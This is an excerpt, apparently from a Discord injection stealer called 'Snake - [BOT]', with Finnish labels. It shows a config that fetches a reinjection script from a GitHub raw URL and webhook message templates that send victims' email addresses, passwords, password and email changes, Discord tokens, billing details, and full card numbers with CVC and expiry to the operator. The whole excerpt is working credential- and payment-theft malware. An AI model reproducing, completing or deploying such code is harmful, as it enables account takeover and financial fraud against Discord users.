...
const config = {
  ...
  embed_name: 'Snake - [BOT]', //name of the webhook thats gonna send the info
  embed_icon: 'https://raw.githubusercontent.com/Kempo22/Injection/main/snake.png'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
  ...
  injection_url: 'https://raw.githubusercontent.com/Kempo22/Injection/main/syovytys.js', //injection url for when it reinjects
  /**
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '**Kayttaja tiedot Info**',
            value: `Email: **${email}** - Salasana: **${password}**`,
            inline: false,
          },
          {
            name: '**Discord Info**',
            value: `Nitro Tyyppi: **${nitro}**\nLeimat: **${badges}**\nLaskutus: **${billing}**`,
            inline: false,
          },
          {
            name: '**Tokeni**',
        ...
        footer: {
          text: '🎉・Olen kylla nyt niin mieleni pahoittanut',
        },
      },
    ],
  };
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '**Salasana vaihdettu**',
            value: `Email: **${json.email}**\nVanha salasana: **${oldpassword}**\nUusi salasana: **${newpassword}**`,
            inline: true,
          },
          {
            name: '**Discord Info**',
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '**Email vaihdettu**',
            value: `Uusi Email: **${email}**\nSalasana: **${password}**`,
            inline: true,
          },
          {
            name: '**Discord Info**',
    ...
    embeds: [
      {
        ...
        fields: [
          {
            name: '**Kortti lisatty**',
            value: `Kortinnumero: **${number}**\nCVC: **${cvc}**\nKortin vanhentuminen: **${expir_month}/${expir_year}**`,
            inline: true,
          },
          {
            name: '**Discord Info**',
